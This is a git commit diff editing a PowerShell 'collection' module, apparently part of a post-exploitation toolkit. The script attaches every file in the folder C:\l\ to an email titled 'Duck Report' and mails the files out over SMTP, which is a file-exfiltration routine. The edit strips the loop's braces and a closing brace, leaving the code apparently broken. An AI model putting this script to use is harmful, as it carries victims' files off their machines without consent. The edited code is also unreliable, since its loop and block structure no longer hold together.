c2d2e4b3b2d179e0b63f75a51e077b337ada7042
pikeno666 <60044049+pikeno666@users.noreply.github.com>
2020-01-27 16:44:47 -0300

    Update Get-emailPowerShellCode.ps1

--- Nova pasta (2)/Nova pasta/data/module_source/collection/Get-emailPowerShellCode.ps1
+++ Nova pasta (2)/Nova pasta/data/module_source/collection/Get-emailPowerShellCode.ps1
@@ -9,12 +9,9 @@ $ReportEmail.Subject = 'Duck Report'
 $ReportEmail.Body = 'Attached is your duck report.... Quack' 
 $files=Get-ChildItem "C:\l\"
 Foreach($file in $files)
-{
 Write-Host “Attaching File :- ” $file
 $attachment = New-Object System.Net.Mail.Attachment –ArgumentList C:\l\$file
 $ReportEmail.Attachments.Add($attachment)
 $SMTPInfo.Send($ReportEmail)
-}
 write-host "Mail Sent Successfully"
 
-}
